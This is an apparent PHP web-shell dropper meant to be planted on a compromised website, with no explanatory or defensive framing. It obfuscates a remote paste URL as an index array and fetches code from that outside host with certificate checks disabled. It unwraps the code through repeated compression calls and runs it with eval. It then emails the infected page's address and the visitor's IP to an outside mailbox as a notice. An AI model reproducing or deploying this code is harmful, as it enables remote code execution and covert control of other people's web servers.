<?php
//@session_start();
@session_write_close();
@ignore_user_abort(true);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set("upload_max_filesize", "9999m");
?>
<?php
//@session_start();
@session_write_close();
@ignore_user_abort(true);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set("upload_max_filesize", "9999m");
error_reporting(0);
$ptZh=array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);$qYKt=[7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 56, 4, 54, 54, 52, 52, 54, 58, 66, 61, 57, 4, 54, 66, 56, 61, 59, 59, 66, 60, 61, 59, 57, 66, 1, 57, 59, 58, 58, 2, 3, 2, 4, 59, 53, 53];$nKtq='';foreach($qYKt as $Jfyr){$nKtq.=$ptZh[$Jfyr];
/////WHAT THE FUCK WITHOUT YOU///
}$Jbna = "$nKtq";function AwCZ($undefined){$MZvt=curl_init();curl_setopt($MZvt,CURLOPT_URL,$undefined);curl_setopt($MZvt,CURLOPT_RETURNTRANSFER,true);curl_setopt($MZvt,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($MZvt,CURLOPT_SSL_VERIFYHOST,false);$jmnX=curl_exec($MZvt);curl_close($MZvt);return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($jmnX))))))));}@eval("?>".gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(AwCZ($Jbna))))))))));
header('Content-Type: text/html; charset=UTF-8');
$main = "rootcyberpunks@gmail.com";
$now = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$notif = "$now *PW : [ " . $â . " ]";
mail($main, "Ding Dong ", $notif, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>

